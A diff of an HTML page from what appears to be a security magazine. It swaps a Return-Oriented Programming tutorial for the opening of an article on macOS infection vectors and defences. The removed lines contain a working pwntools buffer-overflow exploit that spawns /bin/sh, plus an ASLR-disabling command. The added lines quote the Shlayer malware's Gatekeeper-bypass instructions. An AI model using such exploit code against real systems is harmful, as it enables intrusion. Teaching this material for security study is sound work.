@@ -124,6 +124,18 @@ img{display:block;max-width:100%}
   .mag-nav-main{padding:14px 20px}
   .post-grid{grid-template-columns:1fr}
 }
+@media(max-width:560px){
+  .mag-cta{display:none}
+}
+/* the magazine's carousels are styled further down the page; while it streams in they would
+   lay out full-width and phones lock the zoom at ~700px. Constrain them from the <head>. */
+.grid-cinematic,.shelf-track{overflow-x:auto;max-width:100%}
+@media(max-width:768px){
+  html,body{overflow-x:hidden}
+  .article-content img,.article-content video,.article-content iframe{max-width:100%;height:auto}
+  .article-content table{display:block;max-width:100%;overflow-x:auto}
+  .article-content pre{max-width:100%;overflow-x:auto}
+}
 @media(max-width:480px){
   .card-img-wrap,.card-img-placeholder{height:180px}
 }
@@ -1230,7 +1242,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     }
 }
 </style>
-<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/the-art-of-infection-in-macos#article","headline":"The Art Of Infection In MacOS — HADESS Magazine","description":"Introduction\n\n\n\nIn the digital realm, the battle between malicious software creators and cybersecurity defenders is a ceaseless saga, with the Mac ecosystem...","url":"https://hadesssecurity.github.io/blog/read/the-art-of-infection-in-macos","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/the-art-of-infection-in-macos"},"datePublished":"October 25, 2023","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://career.hadess.io/logo-white.png"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2023/10/the-art-of-infection-macos.png"}}]}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/the-art-of-infection-in-macos#article","headline":"The Art Of Infection In MacOS — HADESS Magazine","description":"Introduction\n\n\n\nIn the digital realm, the battle between malicious software creators and cybersecurity defenders is a ceaseless saga, with the Mac ecosystem...","url":"https://hadesssecurity.github.io/blog/read/the-art-of-infection-in-macos","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/the-art-of-infection-in-macos"},"datePublished":"October 25, 2023","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/06/Hadess-Cybersecurity.jpg"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2023/10/the-art-of-infection-macos.png"}}]}</script>
 <!-- Force our dark theme; hide ALL default WP theme output -->
 <style>
 html,body{background:var(--bg)!important;color:var(--text)!important;font-family:var(--font)!important}
@@ -1283,14 +1295,13 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <span>Friday, October 2, 2026</span>
     </div>
     <div class="mag-nav-top-right">
-      <a href="mailto:career@hadess.io">Contact</a>
-      <a href="https://career.hadess.io/privacy">Privacy</a>
-      <a href="https://career.hadess.io/terms">Terms</a>
+      <a href="mailto:security@hadess.io">Contact</a>
+      <a href="/products/">Products &amp; Services</a>
       <div class="mag-social">
         <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
         <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
         <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-        <a href="mailto:career@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+        <a href="mailto:security@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
       </div>
     </div>
   </div>
@@ -1308,16 +1319,16 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
               <a href="/blog?cat=104">Skills &amp; Certifications</a>
               <a href="/blog?cat=76">Career Guide</a>
               <a href="/blog?cat=23">White Paper</a>
-            <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
+            <a href="/products/">Products &amp; Services</a>
     </div>
     <a href="/blog/search" class="mag-search-btn">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35" stroke-linecap="round"/></svg>
       Search...
       <kbd>/</kbd>
     </a>
-    <a href="https://career.hadess.io/login" class="mag-cta">
+    <a href="/products/#contact" class="mag-cta">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Talk to an Expert
     </a>
     <button class="mag-hamburger" onclick="document.getElementById('mobileMenu').classList.add('open')">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16" stroke-linecap="round"/></svg>
@@ -1334,8 +1345,8 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <a href="/blog?cat=76">Career Guide</a>
       <a href="/blog?cat=23">White Paper</a>
     <a href="/blog/search">Search</a>
-  <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
-  <a href="https://career.hadess.io/login" style="color:var(--gold)">Launch Career Platform</a>
+  <a href="/products/">Products &amp; Services</a>
+  <a href="/products/#contact" style="color:var(--gold)">Talk to an Expert</a>
 </div>
 
 <!-- ═══ PAGE-SPECIFIC STYLES ═══ -->
@@ -1547,1464 +1558,1963 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
   <div class="article-content-col">
     <div class="article-content" data-pagefind-body data-pagefind-meta="image:/wp-content/uploads/2023/10/the-art-of-infection-macos.png">
       
-<p class="wp-block-paragraph">&#8220;ROP Gadget Unleashed&#8221; delves into the intricacies of Return-Oriented Programming (ROP) and its significance in modern exploitation techniques. The article elucidates how attackers leverage existing code snippets, or &#8220;gadgets,&#8221; within a program&#8217;s memory to craft malicious payloads, thus circumventing traditional security mechanisms like Data Execution Prevention (DEP). By chaining these gadgets together, which typically end with a return instruction, adversaries can create a controlled flow of execution that leads to the desired exploit without the need to inject new code. This methodology has emerged as a potent technique for attackers, especially in environments where direct code injection is heavily mitigated.</p>
+<h2 class="wp-block-heading" id="h-introduction">Introduction</h2>
 
 
 
-<p class="wp-block-paragraph">The article also highlights the importance of identifying and utilizing effective ROP gadgets in penetration testing and exploit development. It discusses various tools and techniques that can be employed to discover ROP gadgets within binary files, emphasizing the necessity of understanding both the architecture and the underlying assembly language of the target application. Furthermore, &#8220;ROP Gadget Unleashed&#8221; underscores the ongoing arms race between security researchers and attackers, showcasing how the development of robust countermeasures against ROP exploits is crucial for maintaining secure systems. By equipping practitioners with knowledge and practical strategies, the article aims to enhance their ability to protect applications against this sophisticated attack vector.</p>
+<p class="wp-block-paragraph">In the digital realm, the battle between malicious software creators and cybersecurity defenders is a ceaseless saga, with the Mac ecosystem being no exception. The artistry of crafting malware is continually evolving, adapting to the robust security architecture of Mac systems. The infection vector, the conduit through which malware breaches a system, forms the crux of this nefarious artistry. Over time, malevolent actors have honed an array of techniques, ranging from the rudimentary to the highly sophisticated, to penetrate the seemingly impregnable fortress of Mac systems.</p>
 
 
 
-<h1 class="wp-block-heading">Overview of Return-Oriented Programming (ROP)</h1>
+<p class="wp-block-paragraph">In the forthcoming chapter, we delve into the prevalent methods employed by Mac malware maestros. The spectrum of their ingenuity is broad, encapsulating tricks as simple as social engineering to as advanced as exploiting zero-day vulnerabilities remotely. This discourse illuminates the common, yet potent, techniques that form the lexicon of Mac malware authors.</p>
 
 
 
-<p class="wp-block-paragraph">Return-Oriented Programming (ROP) is an advanced exploitation technique that allows attackers to execute code in the presence of security measures like stack canaries and non-executable memory. Instead of injecting malicious code, ROP chains together existing code snippets—called &#8220;gadgets&#8221;—found in a program&#8217;s memory. This method emerged in the mid-2000s, notably highlighted by researchers demonstrating its efficacy against defenses like DEP (Data Execution Prevention). As exploits evolved, ROP became a crucial tool for attackers, enabling them to manipulate program control flow without directly executing injected payloads, thus bypassing many traditional security mechanisms.</p>
+<p class="wp-block-paragraph">We will traverse through the labyrinth of Mac’s protective measures, investigating how malignant emails, counterfeit tech support, bogus updates, and feigned applications masquerade as benign entities to deceive users. The journey further leads us into the dark alleys of Trojanized, pirated, and cracked applications, revealing how they serve as trojan horses, ushering in malicious payloads into the sanctum of Mac systems.</p>
 
 
 
-<p class="wp-block-paragraph">Return-Oriented Programming (ROP) is a sophisticated exploitation technique used to bypass modern security defenses like Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR). Instead of injecting malicious code, ROP reuses existing code snippets, called <strong>gadgets</strong>, found within the memory of a vulnerable program. Gadgets are small sequences of instructions that end in a <code>ret</code> instruction, allowing the attacker to chain them together and control program execution.</p>
+<p class="wp-block-paragraph">As we delve deeper, we will explore the sinister creativity employed in leveraging custom URL schemes, manipulating Office macros, and corrupting Xcode projects. The discourse will also shed light on the escalating threat of supply chain attacks, remote service account compromises, exploits, and the ominous potential of physical access in compromising Mac systems.</p>
 
 
 
-<h4 class="wp-block-heading">Step-by-Step ROP Attack Example</h4>
+<p class="wp-block-paragraph">The narrative aims not merely to delineate the mechanisms of infection but to foster a profound understanding of the malevolent artistry at play, arming the readers with the knowledge to better safeguard their Mac systems against the ever-evolving threats lurking in the digital shadows.</p>
 
 
 
-<p class="wp-block-paragraph">Below is a detailed explanation of how to construct a ROP chain in a vulnerable program, along with essential commands and code snippets to help guide you through a basic ROP exploit.</p>
+<p class="wp-block-paragraph">This exploration into the dark art of Mac infection is not merely an academic expedition but a clarion call for heightened vigilance and fortified defenses in the face of relentless adversarial ingenuity. Through a meticulous examination of these infection techniques, we endeavor to equip readers with the acumen necessary to discern the sinister from the benign, in a world where the macabre dance of malware continues unabated.</p>
 
 
 
-<h5 class="wp-block-heading">1. Disable ASLR (for easier exploitation in practice)</h5>
+<h2 class="wp-block-heading" id="h-mac-protections">Mac Protections</h2>
 
 
 
-<p class="wp-block-paragraph">In many exploit development scenarios, ASLR (Address Space Layout Randomization) can make exploitation harder. You can disable it temporarily using the following command:</p>
+<p class="wp-block-paragraph">Apple has continually fortified its operating system, macOS, against the myriad of threats that lurk in the digital world. The essence of macOS security pivots on thwarting user-assisted infection vectors, which often serve as the gateway for malicious software. This article delves into the evolution of Mac&#8217;s security measures aimed at curbing malware infections and explores the sophisticated mechanisms put in place to ensure a secure user experience.</p>
 
 
 
-<pre class="wp-block-code"><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></pre>
+<p class="wp-block-paragraph"><strong>File Quarantine</strong></p>
 
 
 
-<h5 class="wp-block-heading">2. Find Dependencies and Libraries</h5>
+<p class="wp-block-paragraph">Introduced in OS X Leopard (10.5), File Quarantine was among the first lines of defense established by Apple. Upon attempting to open a downloaded item, File Quarantine presents a warning, seeking explicit user confirmation before proceeding. Apple&#8217;s documentation sagely advises users to abort the operation if they harbor any suspicions regarding the file&#8217;s safety. Here&#8217;s how it works:</p>
 
 
 
-<p class="wp-block-paragraph">Use the <code>ldd</code> command to inspect the shared libraries used by the vulnerable binary. This helps you identify where libc or other shared libraries are located in memory.</p>
+<p class="wp-block-paragraph"># A generic warning presented by File Quarantine</p>
 
 
 
-<pre class="wp-block-code"><code>$ ldd vuln-32
-    linux-gate.so.1 (0xf7fd2000)
-    libc.so.6 =&gt; /lib32/libc.so.6 (0xf7dc2000)   # Important: we will use libc later
-    /lib/ld-linux.so.2 (0xf7fd3000)</code></pre>
+<p class="wp-block-paragraph">&#8220;The file &#8216;example.app&#8217; has been downloaded from the internet. Are you sure you want to open it?&#8221;</p>
 
 
 
-<h5 class="wp-block-heading">3. Locate Gadgets Using ROPgadget</h5>
+<p class="wp-block-paragraph"><strong>Gatekeeper</strong></p>
 
 
 
-<p class="wp-block-paragraph">The core of any ROP exploit is finding gadgets. These are small chunks of code that perform useful operations (like loading a register or calling a function). For instance, a common gadget is <code>pop rdi; ret</code>, which allows the attacker to set up a function argument before a call to a function like <code>system()</code>.</p>
+<p class="wp-block-paragraph">With the advent of OS X Mountain Lion (10.8), Apple unveiled Gatekeeper to combat the escalating threat of malware. Built on the foundation of File Quarantine, Gatekeeper scrutinizes the code-signing information of downloaded items, blocking those failing to comply with system policies. For instance, it verifies that items bear a valid developer ID signature. Here’s a glimpse into checking a downloaded item’s signature using the spctl command:</p>
 
 
 
-<p class="wp-block-paragraph">Install and use ROPgadget to find usable gadgets in the binary:</p>
+<p class="wp-block-paragraph"># Verifying a downloaded item&#8217;s signature</p>
 
 
 
-<pre class="wp-block-code"><code>$ ROPgadget --binary vuln-64 | grep rdi
-0x00000000004011cb : pop rdi ; ret</code></pre>
+<pre class="wp-block-code"><code>$ spctl -a -vvv -t install /path/to/downloaded/item.app</code></pre>
 
 
 
-<p class="wp-block-paragraph">The above command shows that we have found a useful gadget: <code>pop rdi; ret</code> at the address <code>0x4011cb</code>. This gadget will allow us to set up the first argument (RDI register) before calling <code>system()</code>.</p>
+<p class="wp-block-paragraph"><strong>Application Notarization</strong></p>
 
 
 
-<h5 class="wp-block-heading">4. Find System and &#8220;/bin/sh&#8221; Strings in libc</h5>
+<p class="wp-block-paragraph">macOS Catalina (10.15) heralded the advent of application notarization requirements, ensuring that all software undergoes a thorough vetting by Apple before being allowed to run. However, malware authors quickly found a way around this by instructing users on how to execute unnotarized code, as was witnessed with older versions of the Shlayer malware.</p>
 
 
 
-<p class="wp-block-paragraph">Next, we need to find the address of the <code>system()</code> function and the <code>/bin/sh</code> string in libc, which are critical for executing a shell.</p>
+<p class="wp-block-paragraph"># Example of a user-assisted notarization bypass (Shlayer)</p>
 
 
 
-<p class="wp-block-paragraph">To find <code>system()</code>:</p>
+<p class="wp-block-paragraph">&#8220;Go to System Preferences &gt; Security &amp; Privacy &gt; General, and click &#8216;Allow Anyway&#8217; to run the downloaded item.&#8221;</p>
 
 
 
-<pre class="wp-block-code"><code>$ readelf -s /lib32/libc.so.6 | grep system
-   1463: 0003cd10   88 FUNC    GLOBAL DEFAULT   13 system</code></pre>
+<p class="wp-block-paragraph">In some cases, malicious software authors even managed to deceive Apple into notarizing their creations, as seen with more recent versions of Shlayer. The spctl tool can be used to inspect the code-signing information of such deceptive applications:</p>
 
 
 
-<p class="wp-block-paragraph">To find the <code>/bin/sh</code> string:</p>
+<p class="wp-block-paragraph"># Checking the code-signing information of Shlayer&#8217;s malicious application</p>
 
 
 
-<pre class="wp-block-code"><code>$ strings -a -t x /lib32/libc.so.6 | grep /bin/sh
-   18a143 /bin/sh</code></pre>
+<pre class="wp-block-code"><code>$ spctl -a -vvv -t install /Volumes/Install/Installer.app</code></pre>
 
 
 
-<h5 class="wp-block-heading">5. Create the ROP Chain</h5>
+<p class="wp-block-paragraph">/Volumes/Install/Installer.app: accepted</p>
 
 
 
-<p class="wp-block-paragraph">Using the gadgets and addresses we found, we can now build the ROP chain that will exploit the vulnerable program and give us a shell.</p>
+<p class="wp-block-paragraph">source=Notarized Developer ID</p>
 
 
 
-<p class="wp-block-paragraph">Here’s the full Python exploit script using <code>pwntools</code>:</p>
+<p class="wp-block-paragraph">origin=Developer ID Application: Morgan Sipe (4X5KZ42L4B)</p>
 
 
 
-<pre class="wp-block-code"><code>from pwn import *
+<p class="wp-block-paragraph"><strong>The Way Forward</strong></p>
 
-# Start the vulnerable process
-p = process('./vuln-64')
 
-# Base address of libc (can be found or leaked in real-world scenarios)
-libc_base = 0x7ffff7de5000
-system = libc_base + 0x48e20     # Address of system() in libc
-binsh = libc_base + 0x18a143     # Address of "/bin/sh" string in libc
 
-# ROP gadget addresses
-POP_RDI = 0x4011cb  # Address of pop rdi; ret gadget
+<p class="wp-block-paragraph">The continuous battle against malware has seen Apple introduce stringent notarization requirements, significantly enhancing the security of recent macOS versions. However, as malevolent actors find new ways to sidestep these safeguards, or as users on older macOS versions remain vulnerable, the struggle for a malware-free Mac experience perseveres. The evolving tactics of bypassing macOS’s File Quarantine, Gatekeeper, and Notarization underscore the importance of remaining vigilant and updated on the latest security practices and macOS versions.</p>
 
-# Constructing the payload
-payload = b'A' * 72         # Padding to reach return address
-payload += p64(POP_RDI)     # Gadget to set up the RDI register
-payload += p64(binsh)       # Pointer to the "/bin/sh" string
-payload += p64(system)      # Address of system() to call system("/bin/sh")
-payload += p64(0x0)         # Return address after system() is called (can be arbitrary)
 
-# Send the payload
-p.clean()
-p.sendline(payload)
-p.interactive()</code></pre>
 
+<p class="wp-block-paragraph">In subsequent discussions, we will delve into code-signing concepts and tools capable of extracting code-signing information, shedding light on the subtle nuances of macOS security mechanisms and how they can be leveraged for a safer computing environment.</p>
 
 
-<h4 class="wp-block-heading">Breakdown of the Exploit</h4>
 
+<p class="wp-block-paragraph">This comprehensive examination of macOS protections not only unveils the robust security architecture of Mac systems but also accentuates the relentless ingenuity of malware authors in circumventing these defenses. Through a blend of awareness and adherence to recommended security practices, users can significantly mitigate the risks posed by malicious software, ensuring a secure and seamless Mac experience.</p>
 
 
-<ul class="wp-block-list">
-<li><strong>Padding</strong>: We use 72 bytes (<code>'A' * 72</code>) to overflow the buffer and reach the return address.</li>
 
+<h2 class="wp-block-heading" id="h-periodic-scripts"><strong>Periodic Scripts</strong></h2>
 
 
-<li><strong>POP_RDI Gadget</strong>: The <code>pop rdi; ret</code> gadget allows us to control the value of the <code>rdi</code> register (the first argument for system()).</li>
 
+<p class="wp-block-paragraph"><strong>Understanding Periodic Scripts Structure:</strong></p>
 
 
-<li><strong>/bin/sh</strong>: We pass the <code>/bin/sh</code> string as the first argument to <code>system()</code>.</li>
 
+<p class="wp-block-paragraph">In macOS, periodic scripts are organized in the /etc/periodic directory under three subdirectories: daily, weekly, and monthly. Each of these subdirectories contains scripts that run at their specified intervals.</p>
 
 
-<li><strong>System Call</strong>: We call <code>system()</code> with <code>/bin/sh</code>, resulting in spawning a shell.</li>
-</ul>
 
+<p class="wp-block-paragraph">ls /etc/periodic</p>
 
 
-<h5 class="wp-block-heading">6. Running the Exploit</h5>
 
+<p class="wp-block-paragraph">Monitoring and Securing Periodic Scripts:</p>
 
 
-<p class="wp-block-paragraph">To test the exploit, compile your vulnerable program and run the Python script:</p>
 
+<p class="wp-block-paragraph">Permissions:</p>
 
 
-<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th><strong>Step</strong></th><th><strong>Command</strong></th></tr></thead><tbody><tr><td>Disable ASLR</td><td>`echo 0</td></tr><tr><td>Check shared libraries</td><td><code>ldd vuln-32</code></td></tr><tr><td>Find gadgets</td><td>`ROPgadget &#8211;binary vuln-64</td></tr><tr><td>Find system() in libc</td><td>`readelf -s /lib32/libc.so.6</td></tr><tr><td>Find /bin/sh string</td><td>`strings -a -t x /lib32/libc.so.6</td></tr><tr><td>Compile vulnerable program</td><td><code>gcc -m64 -o vuln-64 vuln-64.c</code></td></tr><tr><td>Exploit using Python script</td><td><code>python3 exploit.py</code></td></tr></tbody></table></figure>
 
+<p class="wp-block-paragraph">Ensure that only authorized users have write access to the periodic directories and scripts.</p>
 
 
-<h4 class="wp-block-heading">Significance of ROP in Modern Exploits</h4>
 
+<pre class="wp-block-code"><code>sudo chmod -R 755 /etc/periodic
 
+sudo chown -R root:wheel /etc/periodic</code></pre>
 
-<p class="wp-block-paragraph">ROP plays a pivotal role in bypassing contemporary security measures by leveraging existing code to create dynamic execution paths, making it difficult for traditional defenses to detect and mitigate. In an era where many systems implement protections like Address Space Layout Randomization (ASLR) and stack canaries, ROP allows attackers to circumvent these barriers by using the program&#8217;s own code against it. For defenders, understanding ROP is essential to developing effective countermeasures and improving the overall security posture. This ongoing cat-and-mouse game underscores the importance of ROP not only as a tool for attackers but also as a critical area of focus for cybersecurity professionals aiming to protect systems from sophisticated exploits.</p>
 
 
+<p class="wp-block-paragraph">Auditing:</p>
 
-<p class="wp-block-paragraph">https://github.com/alanvivona/pwnshop and https://github.com/Rizer0/Ropdump</p>
 
 
+<p class="wp-block-paragraph">Establish a mechanism to monitor changes to the /etc/periodic directory.</p>
 
-<h3 class="wp-block-heading">ROP Gadgets</h3>
 
 
+<p class="wp-block-paragraph">Consider utilizing file integrity monitoring systems.</p>
 
-<p class="wp-block-paragraph">ROP gadgets are short sequences of instructions that end with a &#8220;return&#8221; instruction, allowing the control flow to jump to the next gadget in a ROP chain. The purpose of these gadgets is to enable an attacker to construct a payload that can manipulate the program&#8217;s execution flow without injecting any new code, effectively utilizing the existing code within a target application or library. This technique is particularly valuable in scenarios where memory protections are in place, as it allows for exploitation without violating these defenses.</p>
 
 
+<p class="wp-block-paragraph">Script Verification:</p>
 
-<p class="wp-block-paragraph">Extracting ROP gadgets involves analyzing the binary code of a target application, typically using tools designed for disassembly and reverse engineering. Attackers often employ tools like ROPgadget, Ropper, or custom scripts to scan for sequences of instructions that meet the criteria for gadgets. This process includes identifying potential gadgets by searching through the binary for instructions that lead to a return statement, then cataloging these sequences to facilitate the construction of ROP chains. By carefully selecting and chaining these gadgets, attackers can orchestrate complex exploits tailored to bypass security measures and achieve their objectives.</p>
 
 
+<p class="wp-block-paragraph">Regularly review the scripts within the periodic directories to ensure they have not been altered or appended with malicious code.</p>
 
-<h4 class="wp-block-heading">1. <strong>Address Space Layout Randomization (ASLR)</strong></h4>
 
 
+<pre class="wp-block-code"><code>find /etc/periodic -type f -exec ls -l {} \;</code></pre>
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Randomizes memory addresses to make exploitation harder.</li>
 
 
+<p class="wp-block-paragraph">Custom Secure Scripts:</p>
 
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>Memory leaks can reveal address locations.</li>
 
 
+<p class="wp-block-paragraph">If creating custom periodic scripts, follow best practices such as avoiding hard-coded credentials, and ensuring scripts have appropriate permissions and ownership.</p>
 
-<li>If certain libraries or sections are not fully randomized, ROP gadgets can still be located.</li>
-</ul>
-</li>
-</ul>
 
 
+<p class="wp-block-paragraph">System Logging:</p>
 
-<h4 class="wp-block-heading">2. <strong>Data Execution Prevention (DEP)</strong></h4>
 
 
+<p class="wp-block-paragraph">Configure system logging to capture the executions of periodic scripts. This can help in identifying unauthorized script executions or modifications.</p>
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Marks memory regions (e.g., stack, heap) as non-executable.</li>
 
 
+<pre class="wp-block-code"><code>grep "periodic" /var/log/system.log</code></pre>
 
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>ROP reuses existing executable code, bypassing the need to inject new code.</li>
-</ul>
-</li>
-</ul>
 
 
+<p class="wp-block-paragraph">Implementing Intrusion Detection Systems (IDS):</p>
 
-<h4 class="wp-block-heading">3. <strong>Stack Canaries</strong></h4>
 
 
+<p class="wp-block-paragraph">Employ IDS to identify any unusual activity related to the periodic scripts.</p>
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Detects buffer overflows by placing a random value before the return address.</li>
 
 
+<p class="wp-block-paragraph">Disabling Unnecessary Scripts:</p>
 
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>If the canary is leaked, the attacker can overwrite the return address without detection.</li>
-</ul>
-</li>
-</ul>
 
 
+<p class="wp-block-paragraph">If certain periodic scripts are not required for system operations, consider disabling them by removing execution permissions:</p>
 
-<h4 class="wp-block-heading">4. <strong>Control Flow Integrity (CFI)</strong></h4>
 
 
+<pre class="wp-block-code"><code>sudo chmod -x /etc/periodic/daily/500.daily</code></pre>
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Ensures the control flow follows valid paths in the program.</li>
 
 
+<p class="wp-block-paragraph"><strong>Login and Logout Hooks</strong></p>
 
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>ROP gadgets can mimic valid control flows, making it difficult for CFI to detect.</li>
-</ul>
-</li>
-</ul>
 
 
+<p class="wp-block-paragraph">Login and Logout hooks are defined in the com.apple.loginwindow.plist file located in the ~/Library/Preferences/ directory for each user. The hooks are specified with keys LoginHook and LogoutHook with values pointing to the script to be executed.</p>
 
-<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
-https://github.com/xct/ropstar
-</div></figure>
 
 
+<pre class="wp-block-code"><code>&lt;plist version="1.0">
 
-<h4 class="wp-block-heading">Types of ROP Gadgets</h4>
+ &lt;dict>
 
+ &lt;key>LoginHook&lt;/key>
 
+ &lt;string>/usr/bin/hook.sh&lt;/string>
 
-<p class="wp-block-paragraph">ROP gadgets can be classified into several types, each serving distinct purposes in an exploit.</p>
+ &lt;/dict>
 
+&lt;/plist></code></pre>
 
 
-<p class="wp-block-paragraph">POP Gadgets are fundamental for manipulating the stack and registers, as they typically contain one or more POP instructions that load values from the stack into registers. This is essential for setting up the right context for later operations.</p>
 
+<p class="wp-block-paragraph">Securing and Monitoring Login and Logout Hooks:</p>
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Load values from the stack into registers.</li>
 
+<p class="wp-block-paragraph">Permissions:</p>
 
 
-<li><strong>Example</strong>: <code>pop rdi; ret</code></li>
 
+<p class="wp-block-paragraph">Ensure that only authorized users have write access to the com.apple.loginwindow.plist file.</p>
 
 
-<li><strong>Usage</strong>: Essential for setting up parameters before function calls.</li>
-</ul>
 
+<pre class="wp-block-code"><code>sudo chmod 644 ~/Library/Preferences/com.apple.loginwindow.plist
 
+sudo chown root:wheel ~/Library/Preferences/com.apple.loginwindow.plist</code></pre>
 
-<p class="wp-block-paragraph">RET Gadgets are the simplest form of gadgets, consisting of just a RET instruction. They serve to redirect control flow, allowing the execution to jump to the next gadget in a chain, thereby maintaining the sequence of operations.</p>
 
 
+<p class="wp-block-paragraph">Regular Auditing:</p>
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Control flow redirection using <code>ret</code> instructions.</li>
 
 
+<p class="wp-block-paragraph">Periodically check the com.apple.loginwindow.plist file for unexpected LoginHook and LogoutHook entries.</p>
 
-<li><strong>Usage</strong>: Used to jump to the next gadget in a chain, ensuring the sequence of operations.</li>
-</ul>
 
 
+<pre class="wp-block-code"><code>defaults read ~/Library/Preferences/com.apple.loginwindow LoginHook
 
-<p class="wp-block-paragraph">MOV Gadgets facilitate data transfer between registers or between registers and memory. By utilizing these gadgets, attackers can efficiently move values needed for calculations or function parameters, crucial for shaping the exploit&#8217;s behavior.</p>
+defaults read ~/Library/Preferences/com.apple.loginwindow LogoutHook</code></pre>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Move data between registers or memory.</li>
+<p class="wp-block-paragraph">Script Verification:</p>
 
 
 
-<li><strong>Usage</strong>: Useful for setting up function arguments or controlling data flow during the exploit.</li>
-</ul>
+<p class="wp-block-paragraph">Verify the integrity of scripts specified in the login and logout hooks to ensure they have not been altered or appended with malicious code.</p>
 
 
 
-<p class="wp-block-paragraph">Arithmetic Gadgets perform various mathematical operations, including addition, subtraction, multiplication, and division. These gadgets enable dynamic computation of values during the exploit, allowing for more complex manipulations.</p>
+<p class="wp-block-paragraph">Logging and Alerting:</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Perform arithmetic operations like addition, subtraction, or XOR.</li>
+<p class="wp-block-paragraph">Establish logging mechanisms to capture the execution of login and logout hooks.</p>
 
 
 
-<li><strong>Usage</strong>: Can dynamically compute values during exploitation.</li>
-</ul>
